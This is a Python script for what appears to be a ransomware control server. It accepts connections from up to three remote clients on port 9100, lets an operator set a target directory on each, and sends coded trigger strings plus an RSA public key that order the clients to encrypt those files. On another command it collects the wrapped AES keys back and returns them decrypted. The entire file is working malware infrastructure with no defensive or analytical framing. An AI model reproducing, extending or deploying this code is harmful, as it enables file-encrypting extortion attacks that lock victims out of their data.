#!/usr/bin/python3

import socket
import time
import threading
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
#import py7zr
import multivolumefile
import shutil
import os
import gzip
import io

# Dictionary to store client variables
clientDict = {}

# Client key count
clientNo = 0

# Boolean variable to store initial state of connection
update = False

# Variable to store initial state of user input as none
choice = None

# Variable to determine the calling of clientTable()
stop = False


class Server_AES_Encrypt_File:

    def export_rsa_key(self):
        def export(key, filename):
            with open(filename, "wb") as file:
                file.write(key.exportKey('PEM'))
                file.close()

        def imports(filename):
            with open(filename, "rb") as file:
                key = RSA.importKey(file.read())
            return key

        if not (os.path.isfile('private_key.pem') and os.path.isfile('public_key.pem')):
            keypair = RSA.generate(4096)
            public_key = keypair.publickey()

            export(keypair, 'private_key.pem')
            export(public_key, 'public_key.pem')

        # pub_key = imports('public_key.pem')

        with open("public_key.pem", "rb") as file:
            pub_key = file.read()

        return pub_key

    def main(self):
        print("[+] Creating RSA Key Pairs")
        key = self.export_rsa_key()
        print("[+] Complete!!")
        return key


class Server_AES_Decrypt_File:
    def __init__(self, keys_path):
        self.private_key = None
        self.keys_path = keys_path

    def import_private_key(self):
        with open("private_key.pem", "rb") as file:
            key = RSA.importKey(file.read())

            self.private_key = key

    def decrypt_with_rsa(self, file_path):

        file = open(file_path, "rb")
        data = file.read()
        file.close()

        decryptor = PKCS1_OAEP.new(self.private_key)
        decrypted = decryptor.decrypt(data)

        file = open(file_path, "wb")
        file.write(decrypted)
        file.close()

    def rsa_run_decrypt(self):
        path_d = []

        for directory in os.walk(self.keys_path):
            path_d.append(directory)

        for key in path_d[0][-1]:
            self.decrypt_with_rsa(path_d[0][0] + key)


    def aes_key_retrieve(self, retrieve_type):
        if retrieve_type == 1:
            # either use (os.mkdir("keys") to os.rmdir("keys/key") for server or just use py7zr

            # with py7zr.SevenZipFile("key", 'r') as archive:
            #     archive.extractall()

            os.mkdir("keys")
            shutil.unpack_archive("key", "keys/key", "zip")
            for file_name in os.listdir("keys/key"):
                shutil.move(os.path.join("keys/key", file_name), "keys")
            os.rmdir("keys/key")


        else:
            # either use gzip for both server and client or just use py7zr

            with multivolumefile.open(self.keys_path + 'aes_keys_archive', mode='rb') as target_archive:
                with gzip.open(target_archive, 'rb') as ip:
                    with io.TextIOWrapper(ip, encoding='utf-8') as decoder:
                        # Let's read the content using read()
                        content = decoder.read()
                        open("aes_keys", "w").write(content)

            # with multivolumefile.open(self.keys_path + 'aes_keys_archive', mode='rb') as target_archive:
            #     with py7zr.SevenZipFile(target_archive, 'r') as archive:
            #         archive.extractall()

            shutil.rmtree(self.keys_path)
            os.remove("key")

    def main(self):
        self.import_private_key()
        print("[+] Extracting Keys")
        self.aes_key_retrieve(1)
        print("[+] Decrypting Keys")
        self.rsa_run_decrypt()
        print("[+] Complete!!")
        self.aes_key_retrieve(2)


# Function to set path of encryption
def clientChoose(choiceInt):
    x = 1
    for num in clientDict:
        if choiceInt == str(x):
            while True:
                path = input("Set path for client " + num + ": ")
                if path == "Exit":
                    break
                clientDict[num][2].send(b'D@nC1nGM0nK3yPATHdjShankeyShoe')
                clientDict[num][2].send(path.encode('utf-8'))
                reply = clientDict[num][2].recv(9999)
                if reply == b'Error':
                    print("Wrong path, please enter again :)")
                elif reply == b'Exists':
                    print("Valid Path.")
                    clientDict[num].append(path)
                    time.sleep(2)
                    break
            new_line()
            client_print()
            phase_1()
        x += 1


# Function to output next part of the code in new command prompt interface
def new_line():
    print("\n" * 70)
    os.system('clear')

# Function that prints out the list of clients in table form
def client_print():
    result = "{:<8} {:<15} {:<10}".format('Client', 'Address', 'Port')
    for keys in clientDict:
        result += "\n{:<8} {:<15} {:<10}".format(keys, clientDict[keys][0], clientDict[keys][1])
    print(result)


# Function to determine bahaviour of the program.
def newUpdates():
    global update, clientNo, choice, stop

    # If there is new connection, reset variable update to False
    if update:
        update = False
        # If there is more than 1 client, print update line and set variable stop to True.
        # If stop = True, it will not call newUpdates()
        if clientNo > 1:
            new_line()
            print("\n<Updating Contents....Hit Enter to Continue>")
            stop = True

            while True:
                # If choice is still None, waits for user input.
                if choice is None:
                    time.sleep(1)
                else:
                    # If user input exists, set variable stop to false and print client list and menu options
                    stop = False
                    new_line()
                    client_print()
                    phase_1()
                    break

        else:
            new_line()
            client_print()
            phase_1()


# Function to process user input
def phase_1():
    global choice
    choice = None
    choice = input("\n1.Choose Client[1-3] \n2.Encrypt\n3.Decrypt\n\nChoice: ")
    try:
        int(choice)
        clientChoose(choice)

    except ValueError:
        if choice == "Encrypt":
            setPath = True
            for num in clientDict:
                if len(clientDict[num]) != 4:
                    print("Path for IP " + str(clientDict[num][0]) + " is not set")
                    setPath = False
            time.sleep(2)

            if setPath:
                pubs_key = Server_AES_Encrypt_File().main()
                for num in clientDict:
                    clientDict[num][2].send(b'B!GP0ndENCRYPTsmallFishZY')
                    time.sleep(0.3)
                    clientDict[num][2].send(pubs_key + b'@@Encrypt@@' + clientDict[num][-1].encode('utf-8'))
                    del clientDict[num][-1]
                    time.sleep(2)
                new_line()
                client_print()
                phase_1()
            else:
                phase_1()

        elif choice == "Decrypt":
            for num in clientDict:
                clientDict[num][2].send(b'y3sD@DDyDECRYPTBigPaPaYJ')
                data = b''
                while True:
                    reply = clientDict[num][2].recv(9999)
                    print("[+] Receiving Keys")
                    if reply == b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN':
                        break
                    else:
                        data += reply
                print()
                file = open('key', 'wb')
                file.write(data)
                file.close()
                Server_AES_Decrypt_File("keys/").main()
                time.sleep(1)
                file = open('aes_keys', 'rb')
                keyfile = file.read()
                file.close()
                clientDict[num][2].send(keyfile)
                time.sleep(0.5)
                clientDict[num][2].send(b'l9R0260myxF0vU19ugRCnkIbtj8X0bamDmw8crq4CTC5AlkIa4RZidKKtGJzB3W8mDD0xN')
            os.remove('aes_keys')
            new_line()
            client_print()
            phase_1()

        elif choice == "Quit":
            exit()
        elif choice == "":
            pass
        else:
            print("Invalid option, please enter again :)")
            phase_1()


# Function to establish socket connection
def socketConn():
    global clientDict, update, clientNo
    # Reserve a port for service.
    port = 9100
    ip = ""

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind to the port
    s.bind((ip, port))
    # Wait for client connection. 3 clients
    s.listen(3)
    print("No device found. Socket is listening...")

    while True:
        # Establish connection with client.
        client, address = s.accept()
        # Set variable update to true.
        update = True
        # Adds one to variable clientNo and add connection to the clientDict dictionary
        clientNo += 1
        clientDict[str(clientNo)] = [address[0], address[1], client]

        # At this state of code, stop = False, hence if stop = True, start new thread to call newUpdates()
        if not stop:
            connect = threading.Thread(target=newUpdates)
            connect.start()


# Calls the socketConn function
socketConn()
